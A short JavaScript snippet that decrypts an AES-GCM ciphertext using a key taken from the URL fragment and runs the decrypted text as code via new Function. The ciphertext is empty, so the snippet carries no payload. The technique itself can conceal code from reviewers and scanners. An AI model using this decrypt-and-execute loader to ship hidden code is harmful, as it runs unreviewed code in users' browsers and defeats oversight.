
(async () => {
  function hex2buf(hex) {
    const bytes = new Uint8Array(hex.length / 2);
    for (let i = 0; i < bytes.length; i++) {
      bytes[i] = parseInt(hex.substr(i * 2, 2), 16);
    }
    return bytes;
  }

  const encryptedHex = "";
  const ivHex = "7d9b943ce6ceb87800579b5e";
  const urlKey = location.hash.slice(1);
  if (!urlKey) {
    console.error("Missing key in URL fragment");
    return;
  }

  const key = hex2buf(urlKey);
  const iv = hex2buf(ivHex);
  const encryptedData = hex2buf(encryptedHex);

  const cryptoKey = await crypto.subtle.importKey("raw", key, "AES-GCM", false, ["decrypt"]);
  const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, cryptoKey, encryptedData);
  const decoder = new TextDecoder();
  const code = decoder.decode(decrypted);
  (new Function(code))();
})();
      